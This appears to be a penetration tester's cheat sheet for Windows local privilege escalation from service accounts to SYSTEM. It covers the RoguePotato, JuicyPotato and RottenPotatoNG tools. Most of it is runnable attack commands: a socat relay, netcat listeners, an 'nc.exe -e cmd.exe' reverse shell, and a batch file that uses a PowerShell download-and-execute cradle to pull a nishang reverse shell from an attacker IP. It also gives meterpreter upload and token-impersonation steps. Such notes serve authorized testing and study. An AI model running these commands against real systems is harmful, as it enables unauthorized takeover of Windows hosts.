# RoguePotato / JuicyPotato / RottenPotatoNG

##  Required privs

```cmd
SeImpersonatePrivilege
```
(show privs via `whoami /priv`)  

## RoguePotato
> Another Windows Local Privilege Escalation from Service Account to System  
https://github.com/antonioCoco/RoguePotato

Setup relay (can run e.g. on attacking machine)
```bash
socat tcp-listen:135,reuseaddr,fork tcp:<target-ip>:9999
```

Set up listener
```bash
nc -nlvp 1337
```

Run exploit
```cmd
RoguePotato.exe -r <relay-ip> -e "nc.exe <local-ip> 1337 -e cmd.exe" -l 9999
```

## JuicyPotato 
> A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM.  
[Releases · ohpe/juicy-potato · GitHub](https://github.com/ohpe/juicy-potato/releases)  
-> https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe  

⚠️ ** Microsoft patched this Vulnerability in Windows Versions 1809/Build 17763** ⚠️  
(works until 1803 / 17134)  

[No more rotten/juicy potato? – Decoder's Blog](https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/)

**Example**

Using nishang reverse shell
```powershell
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
```
-> append `Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>` to the end of the file to automatically execute the shell

Create and upload helper bat file to execute powershell stuff
```
shell.bat
```

```
cmd /c powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object System.Net.WebClient).DownloadString('http://<ip>/Invoke-PowerShellTcp.ps1')
```

Start listener
```
nc -nlvp <port>
```

Execute
```
.\JuicyPotato.exe -t * -p C:\Users\<user>\Documents\shell.bat -l 1234
```
 -> Currently unsure why `l` is needed  

⚠️ **Troubleshooting** ⚠️  

If not working (e.g. error 10038) try another `clsid` from  
* [Windows CLSID | juicy-potato](http://ohpe.it/juicy-potato/CLSID/)  
* [juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise at master · ohpe/juicy-potato · GitHub](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise)

```
-c '{<cls-id>}'
```

## RottenPotatoNG

> New version of RottenPotato as a C++ DLL and standalone C++ binary - no need for meterpreter or other tools.  
* [GitHub - breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)  
* [Abusing Token Privileges For Windows Local Privilege Escalation](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)  

In msf meterpreter (multi/handler)
```
upload /path/to/rottenpotato.exe
execute -cH -f rottenpotato.exe
```
<wait a few seconds>
```
load incognito
list_tokens -u
```
